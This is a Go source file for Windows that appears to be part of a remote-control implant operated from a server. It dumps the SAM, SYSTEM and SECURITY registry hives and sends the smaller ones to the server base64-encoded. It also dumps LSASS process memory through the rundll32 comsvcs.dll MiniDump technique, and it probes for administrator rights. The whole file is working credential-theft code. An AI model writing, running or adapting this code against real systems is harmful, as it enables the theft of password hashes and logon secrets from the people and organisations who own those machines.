//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

// Hives under this size are base64-inlined to the server; larger ones (SYSTEM
// can be 10-50MB) are dumped to disk and only the path is reported so the
// operator can pull them through the file browser.
const maxInlineHive = 6 * 1024 * 1024

func tempDir() string {
	d := filepath.Join(os.TempDir(), "mimik")
	_ = os.MkdirAll(d, 0700)
	return d
}

func dumpHives(payload []byte) {
	dir := tempDir()
	sendEvent("status", map[string]interface{}{"state": "dumping", "detail": "saving SAM / SYSTEM / SECURITY"})

	hives := []struct{ key, name string }{
		{`HKLM\SAM`, "sam.hiv"},
		{`HKLM\SYSTEM`, "system.hiv"},
		{`HKLM\SECURITY`, "security.hiv"},
	}

	for _, h := range hives {
		out := filepath.Join(dir, h.name)
		cmd := exec.Command("reg", "save", h.key, out, "/y")
		if err := cmd.Run(); err != nil {
			sendEvent("error", map[string]interface{}{"message": "dump " + h.name + " failed: " + err.Error() + " (admin required)"})
			sendEvent("status", map[string]interface{}{"state": "idle"})
			return
		}
		info, err := os.Stat(out)
		size := int64(0)
		if err == nil {
			size = info.Size()
		}

		if size > 0 && size <= maxInlineHive {
			if data, err := os.ReadFile(out); err == nil {
				sendEvent("hive", map[string]interface{}{
					"name": h.name,
					"size": size,
					"data": base64.StdEncoding.EncodeToString(data),
				})
				continue
			}
		}
		sendEvent("hive", map[string]interface{}{"name": h.name, "size": size, "path": out})
	}
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "hives dumped to " + dir})
}

func lsassPID() (int, error) {
	out, err := exec.Command("powershell", "-NoProfile", "-Command", "(Get-Process lsass -ErrorAction SilentlyContinue).Id").Output()
	if err != nil {
		return 0, err
	}
	s := strings.TrimSpace(string(out))
	if s == "" {
		return 0, fmt.Errorf("lsass process not found")
	}
	return strconv.Atoi(s)
}

func dumpLsass(payload []byte) {
	dir := tempDir()
	pid, err := lsassPID()
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "find lsass failed: " + err.Error()})
		return
	}

	out := filepath.Join(dir, "lsass.dmp")
	cmd := exec.Command("rundll32.exe", `C:\Windows\System32\comsvcs.dll`, "MiniDump", strconv.Itoa(pid), out, "full")
	if err := cmd.Run(); err != nil {
		sendEvent("error", map[string]interface{}{"message": "lsass dump failed: " + err.Error() + " (admin + SeDebugPrivilege required)"})
		return
	}

	info, err := os.Stat(out)
	size := int64(0)
	if err == nil {
		size = info.Size()
	}
	sendEvent("lsass", map[string]interface{}{"path": out, "size": size, "pid": pid})
	sendEvent("status", map[string]interface{}{"state": "done", "detail": "lsass dumped: " + out})
}

func checkPriv() {
	out := filepath.Join(tempDir(), "privtest.hiv")
	err := exec.Command("reg", "save", `HKLM\SAM`, out, "/y").Run()
	admin := err == nil
	_ = os.Remove(out)
	sendEvent("priv", map[string]interface{}{"admin": admin})
	sendEvent("status", map[string]interface{}{"state": "idle", "admin": admin})
}
